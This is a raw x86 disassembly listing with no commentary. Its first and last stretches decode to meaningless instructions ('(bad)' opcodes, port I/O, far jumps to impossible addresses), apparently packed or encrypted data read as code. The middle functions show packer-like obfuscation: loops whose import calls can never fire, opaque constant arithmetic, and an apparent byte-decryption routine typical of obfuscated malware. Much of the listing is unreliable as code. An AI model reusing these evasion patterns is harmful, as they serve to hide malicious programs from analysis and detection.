  4039d0:	pop    ds
  4039d1:	mov    esi,0x349be37c
  4039d6:	sub    DWORD PTR [esi+0x65],ebx
  4039d9:	aas    
  4039da:	pop    ds
  4039db:	and    DWORD PTR [edi+0x36bd46d5],eax
  4039e1:	out    dx,al
  4039e2:	in     al,0x59
  4039e4:	shl    BYTE PTR [eax+ecx*1+0x50],1
  4039e8:	inc    ebx
  4039e9:	ss push es
  4039eb:	ficomp DWORD PTR [esi]
  4039ed:	or     dh,BYTE PTR ds:0xde61d710
  4039f3:	cmp    eax,0x9506be9
  4039f8:	daa    
  4039f9:	ret    0xde64
  4039fc:	add    al,ch
  4039fe:	jg     0x403a36
  403a00:	dec    edx
  403a01:	ret    0x199a
  403a04:	fimul  WORD PTR [edx]
  403a06:	inc    eax
  403a07:	les    edx,FWORD PTR [edi]
  403a09:	cld    
  403a0a:	data16 mov ah,0x51
  403a0d:	and    eax,0x6f364d6f
  403a12:	dec    esi
  403a13:	push   ecx
  403a14:	mov    al,ds:0x81b48820
  403a19:	into   
  403a1a:	data16 add dl,BYTE PTR [esi+0x51]
  403a1e:	pop    ecx
  403a1f:	pop    esi
  403a20:	gs xor eax,0x31a3b36b
  403a26:	mov    eax,0xcf9768ac
  403a2b:	jo     0x403a60
  403a2d:	out    0xa0,eax
  403a2f:	cs dec ebp
  403a31:	dec    ebx
  403a32:	add    al,0x9a
  403a34:	adc    BYTE PTR [ecx-0x12c3a55e],al
  403a3a:	pop    es
  403a3b:	jmp    0x4039d3
  403a3d:	mov    ebp,0x8363d79a
  403a42:	inc    ecx
  403a43:	push   eax
  403a44:	in     al,0x70
  403a46:	punpckhdq mm1,mm6
  403a49:	retf   
  403a4a:	lock sbb esp,DWORD PTR [ebp-0x34c3d8d7]
  403a51:	add    bl,ch
  403a53:	(bad)  
  403a54:	mov    dh,0x13
  403a56:	je     0x4039e4
  403a58:	xor    bh,BYTE PTR [esi+0x1e94467b]
  403a5e:	lock lods al,BYTE PTR ds:[esi]
  403a60:	fistp  QWORD PTR [ebx+0xc489949]
  403a66:	xor    al,0xbf
  403a68:	aad    0xd1
  403a6a:	add    al,0x14
  403a6c:	std    
  403a6d:	and    BYTE PTR [ebx+0x58],al
  403a70:	enter  0x2ad3,0x9d
  403a74:	adc    eax,eax
  403a76:	enter  0xc59a,0xc1
  403a7a:	imul   esi,DWORD PTR [ebp+0x17],0x7
  403a7e:	out    0xe2,al
  403a80:	pop    esi
  403a81:	test   DWORD PTR [edi+ebp*8+0xd],ebp
  403a85:	mov    ds:0xf687bcb5,eax
  403a8a:	neg    BYTE PTR [esi+ebx*4-0x4728bb7]
  403a91:	inc    ebx
  403a92:	mov    edx,0x9f2c0d7e
  403a97:	lods   al,BYTE PTR ds:[esi]
  403a98:	jb     0x403a7c
  403a9a:	xchg   esp,eax
  403a9b:	and    DWORD PTR [ebx],ebx
  403a9d:	fsubr  QWORD PTR [edx]
  403a9f:	or     al,0x7a
  403aa1:	push   cs
  403aa2:	inc    edx
  403aa3:	and    BYTE PTR [edi-0x69cf4c5d],0x63
  403aaa:	(bad)  
  403aac:	aas    
  403aad:	arpl   di,si
  403aaf:	add    DWORD PTR [eax],ecx
  403ab1:	mov    dl,0x8f
  403ab3:	repnz adc BYTE PTR [eax+ebx*1-0x7fe490dc],dh
  403abb:	(bad)  
  403abc:	xor    esp,ecx
  403abe:	inc    esi
  403abf:	(bad)  
  403ac0:	mov    BYTE PTR [esi+eiz*4+0x34],dh
  403ac4:	pop    es
  403ac5:	sbb    al,0x5
  403ac7:	mov    ah,0xf0
  403ac9:	sub    eax,0xade6afaa
  403ace:	fstp   DWORD PTR ds:0xc7bcb726
  403ad4:	adc    dh,bl
  403ad6:	icebp  
  403ad7:	fbld   TBYTE PTR [ecx]
  403ad9:	adc    cl,ch
  403adb:	mov    edx,0x66c04982
  403ae0:	xchg   ecx,eax
  403ae1:	xchg   ecx,eax
  403ae2:	pop    es
  403ae3:	xchg   edx,eax
  403ae4:	fnsave [ebx+0x4bf15724]
  403aea:	cmp    DWORD PTR [eax+ebx*2+0xde4302b],esi
  403af1:	push   edi
  403af2:	ror    DWORD PTR [ebx],cl
  403af4:	add    cl,al
  403af6:	cld    
  403af7:	mov    ds:0x6596cb66,al
  403afc:	push   ebx
  403afd:	inc    ebx
  403afe:	ds pop edx
  403b00:	test   BYTE PTR [ebp+0x2f],ch
  403b03:	test   esi,ebx
  403b05:	iret   
  403b06:	int    0x8d
  403b08:	inc    eax
  403b09:	test   edi,0xd75cebf2
  403b0f:	sbb    ebx,DWORD PTR [esi-0x30]
  403b12:	or     bh,BYTE PTR [edx+0xe6b0d53]
  403b18:	push   0x16
  403b1a:	xchg   esp,eax
  403b1b:	adc    dl,BYTE PTR [edi-0x47989321]
  403b21:	stos   DWORD PTR es:[edi],eax
  403b22:	lahf   
  403b23:	pop    ecx
  403b24:	add    al,0x12
  403b26:	or     DWORD PTR [ebp+0x7bddd072],0xb
  403b2d:	and    ebx,DWORD PTR [edx+0x7cbb68e6]
  403b33:	rcr    DWORD PTR ds:0x133633a3,0x68
  403b3a:	bound  ebx,QWORD PTR [edx]
  403b3c:	push   es
  403b3d:	inc    esi
  403b3f:	or     al,0xaa
  403b41:	and    eax,0xf3dd7dde
  403b46:	daa    
  403b47:	xor    edx,DWORD PTR [edi+ecx*4]
  403b4a:	xchg   esp,eax
  403b4b:	dec    esi
  403b4c:	sbb    ebx,DWORD PTR [eax]
  403b4e:	jl     0x403b75
  403b50:	and    al,0x33
  403b52:	cdq    
  403b53:	fdiv   st,st(1)
  403b55:	mov    esp,DWORD PTR [esi+ecx*4+0x77]
  403b59:	pop    edx
  403b5a:	mov    dl,0xef
  403b5c:	fs fsubr st(1),st
  403b5f:	sbb    al,0x5a
  403b61:	shl    DWORD PTR [esi],1
  403b63:	and    eax,0xed6f63a
  403b68:	mov    ebx,0xc5185290
  403b6d:	add    cl,BYTE PTR [ecx-0x19b2187]
  403b73:	jmp    0xeae7:0x47616b83
  403b7a:	lods   al,BYTE PTR ds:[esi]
  403b7b:	jnp    0x403be7
  403b7d:	sti    
  403b7e:	lods   al,BYTE PTR ds:[esi]
  403b7f:	icebp  
  403b80:	hlt    
  403b81:	shl    DWORD PTR [eax-0x66],0x64
  403b85:	cmc    
  403b86:	in     al,0xc7
  403b88:	loopne 0x403b88
  403b8a:	aaa    
  403b8b:	popa   
  403b8c:	fs jge 0x403b9c
  403b8f:	dec    BYTE PTR [edi-0x1c]
  403b92:	gs sti 
  403b94:	mov    cl,0xb3
  403b96:	push   ss
  403b97:	jb     0x403b6f
  403b99:	mov    bh,cl
  403b9b:	pop    edx
  403b9c:	sub    DWORD PTR [edi-0x716a9fce],ecx
  403ba2:	sar    ebp,1
  403ba4:	inc    BYTE PTR [ebp+0x15bd515e]
  403baa:	shl    BYTE PTR [ebx],1
  403bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bad:	cmp    eax,0xd226d67b
  403bb2:	mov    esi,0xa15757ef
  403bb7:	bnd jae 0x403b6f
  403bba:	push   ecx
  403bbb:	in     al,dx
  403bbc:	pop    ecx
  403bbd:	and    al,0xcd
  403bbf:	mov    esi,0xfbb9ec80
  403bc4:	jne    0x403b49
  403bc6:	ins    BYTE PTR es:[edi],dx
  403bc7:	and    eax,esp
  403bc9:	sub    ecx,DWORD PTR ds:0x13dd89fa
  403bcf:	xor    DWORD PTR [edi],edi
  403bd1:	(bad)  
  403bd2:	lds    edi,FWORD PTR [esi]
  403bd4:	inc    ebp
  403bd5:	inc    ebx
  403bd7:	sbb    BYTE PTR [esi-0x40],cl
  403bda:	les    esi,FWORD PTR [ebx]
  403bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bdd:	push   ss
  403bde:	and    eax,0x3b6823d0
  403be3:	xchg   edx,eax
  403be4:	iret   
  403be5:	cmp    dl,ah
  403be7:	ins    BYTE PTR es:[edi],dx
  403be8:	sub    eax,eax
  403bea:	ret    0x2164
  403bed:	jne    0x403c57
  403bef:	cmp    bh,al
  403bf1:	cmp    eax,0x3edca27c
  403bf6:	enter  0x3e37,0xee
  403bfa:	push   ecx
  403bfb:	push   cs
  403bfc:	shr    DWORD PTR [ecx+edx*1],0xad
  403c00:	push   0xffffff9e
  403c02:	mov    esp,gs
  403c04:	ret    
  403c05:	xor    eax,0xdd59f71
  403c0a:	jp     0x403bf0
  403c0c:	imul   esp,DWORD PTR [ecx],0xffffffa1
  403c0f:	test   bh,bl
  403c11:	cmp    ebx,DWORD PTR [ebx]
  403c13:	jbe    0x403c2f
  403c15:	loop   0x403c3f
  403c17:	icebp  
  403c18:	out    0xf2,eax
  403c1a:	dec    ebx
  403c1b:	jge    0x403c1b
  403c1d:	sbb    DWORD PTR [esi],esi
  403c1f:	mov    eax,ss:0xd071defa
  403c25:	add    eax,0xd7ade1b
  403c2a:	adc    cl,BYTE PTR [ebx-0x21f96348]
  403c30:	loope  0x403c5b
  403c32:	mov    WORD PTR [ebx],ds
  403c34:	add    bl,BYTE PTR [edx-0xe]
  403c37:	pop    ecx
  403c38:	sbb    bl,BYTE PTR [edi+0x40fd3654]
  403c3e:	pop    esp
  403c3f:	xchg   esi,eax
  403c40:	push   ds
  403c41:	sti    
  403c42:	gs retf 0xd564
  403c46:	push   ebp
  403c47:	inc    ebp
  403c48:	data16 (bad) 
  403c4a:	xchg   esp,eax
  403c4b:	cdq    
  403c4c:	out    0x2a,al
  403c4e:	push   eax
  403c4f:	test   edx,ecx
  403c51:	add    al,0xe0
  403c53:	mov    eax,ecx
  403c55:	or     BYTE PTR [ebx+0x36],0x74
  403c59:	jne    0x403be2
  403c5b:	imul   ebx,DWORD PTR [ebx-0x4b1a82b6],0xef5ac0ae
  403c65:	mov    esp,0xc1d72ccb
  403c6a:	pop    ss
  403c6b:	push   0x3b
  403c6d:	stos   BYTE PTR es:[edi],al
  403c6e:	inc    eax
  403c6f:	xor    eax,0x67e039e7
  403c74:	dec    ecx
  403c75:	ins    DWORD PTR es:[edi],dx
  403c76:	test   al,0xe4
  403c78:	js     0x403cc2
  403c7a:	pop    edi
  403c7b:	mov    bp,sp
  403c7e:	ficomp WORD PTR [ebx+esi*1]
  403c81:	enter  0x4d89,0x8
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4fc,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff2f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x729c947b
  4042a6:	in     al,0xc4
  4042a8:	mov    esp,0x62625f1a
  4042ad:	sub    bl,BYTE PTR [edi+0x62]
  4042b0:	(bad)  
  4042b1:	retf   0x7a10
  4042b4:	push   esp
  4042b5:	adc    DWORD PTR [edx-0x78a7d9fa],ebx
  4042bb:	cli    
  4042bc:	(bad)
  4042bf:	xor    eax,0xe4e402d9
  4042c4:	sbb    BYTE PTR [edi+ebp*8+0x45c888cd],dh
  4042cb:	mov    edi,0x6243fd9
  4042d0:	sbb    eax,0x54a9621c
  4042d5:	(bad)
  4042d8:	push   ss
  4042d9:	inc    eax
  4042da:	ja     0x404304
  4042dc:	rcl    BYTE PTR [esi],0x71
  4042df:	stos   BYTE PTR es:[edi],al
  4042e0:	and    al,0xd2
  4042e2:	out    dx,al
  4042e3:	mov    edx,0x5440841
  4042e8:	xchg   edx,eax
  4042e9:	cmc    
  4042ea:	jge    0x404302
  4042ec:	mov    fs,edi
  4042ee:	dec    edi
  4042ef:	dec    edi
  4042f1:	xor    BYTE PTR [ebp-0x180aad3b],cl
  4042f7:	stos   DWORD PTR es:[edi],eax
  4042f8:	mov    ch,0x4a
  4042fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042fc:	jle    0x4042bd
  4042fe:	std    
  4042ff:	sbb    ch,BYTE PTR [eax-0x70e727f0]
  404305:	sub    al,0x5c
  404307:	dec    edx
  404308:	fadd   st,st(3)
  40430a:	mov    al,ch
  40430c:	daa    
  40430d:	dec    edi
  40430e:	sbb    esp,ebp
  404310:	sahf   
  404311:	mov    ds:0x180f655a,al
  404316:	jmp    0x4a82ab43
  40431b:	inc    edi
  40431c:	mov    al,0x37
  40431e:	out    dx,al
  40431f:	pop    ss
  404320:	inc    ecx
  404321:	mov    ch,0x7f
  404323:	mov    esi,DWORD PTR [ebp-0x47]
  404326:	fwait
  404327:	xor    BYTE PTR [ecx+0x6e],al
  40432a:	mov    ebp,0xdb3956d2
  40432f:	in     eax,dx
  404330:	xchg   ebp,eax
  404331:	imul   BYTE PTR [ebx]
  404333:	sbb    BYTE PTR [eax-0x7569d0b3],ch
  404339:	inc    ebp
  40433a:	add    al,0x9a
  40433c:	scas   al,BYTE PTR es:[edi]
  40433d:	xchg   ebp,eax
  40433e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40433f:	jo     0x40432e
  404341:	fsub   st(3),st
  404343:	arpl   WORD PTR [esi+0x60],di
  404346:	lods   al,BYTE PTR ds:[esi]
  404347:	sbb    BYTE PTR [ecx-0x21],ah
  40434a:	pop    esp
  40434b:	push   edi
  40434c:	and    al,BYTE PTR [eax-0x7ea6c4c7]
  404352:	sub    bh,BYTE PTR [edi-0x4dfada7b]
  404358:	cdq    
  404359:	(bad)  
  40435a:	or     edi,DWORD PTR [ecx]
  40435c:	jno    0x404329
  40435e:	repz out 0x84,al
  404361:	mov    ah,0xc3
  404363:	and    dl,bh
  404365:	add    DWORD PTR [eax+0x313bce06],ebx
  40436b:	sbb    dl,BYTE PTR [esi]
  40436d:	inc    eax
  40436e:	mov    al,ds:0xc14fe0c6
  404373:	adc    DWORD PTR gs:[ecx+edi*4+0x39],ebx
  404378:	out    0x88,al
  40437a:	(bad)  [ebx-0x21]
  40437d:	enter  0xb777,0xee
  404381:	pop    ss
  404382:	cmc    
  404383:	mov    edx,0x30f8ff17
  404388:	mov    al,ah
  40438a:	inc    esi
  40438b:	cmp    DWORD PTR [ebp-0x55d2e429],0x25580752
  404395:	mul    BYTE PTR [ecx+edx*8+0x12ebaf65]
  40439c:	or     BYTE PTR [esi-0x24717407],cl
  4043a2:	sub    DWORD PTR [ecx],0x855b1c80
  4043a8:	stos   BYTE PTR es:[edi],al
  4043a9:	rcl    BYTE PTR [ecx+ebp*2-0x4a],1
  4043ad:	adc    ebp,DWORD PTR [esi+0x40]
  4043b0:	(bad)  
  4043b1:	and    DWORD PTR [esi],edx
  4043b3:	adc    DWORD PTR [ecx-0x79],0x5
  4043b7:	adc    esi,DWORD PTR [eax-0x32]
  4043ba:	dec    ebx
  4043bb:	fldenv [ecx-0x1b]
  4043be:	dec    esi
  4043bf:	push   eax
  4043c0:	sub    al,0x5
  4043c2:	or     DWORD PTR [ecx-0x4e],esi
  4043c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c6:	or     eax,0x4c1e9078
  4043cb:	mov    dl,0x32
  4043cd:	jae    0x4043d9
  4043cf:	sbb    ecx,DWORD PTR [edx-0x10]
  4043d2:	jmp    0xd4e6:0xb735c868
  4043d9:	push   ebx
  4043da:	mov    BYTE PTR [eax],bl
  4043dc:	push   ss
  4043dd:	jg     0x4043a7
  4043df:	mov    DWORD PTR [esi+0x2efb1907],edi
  4043e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
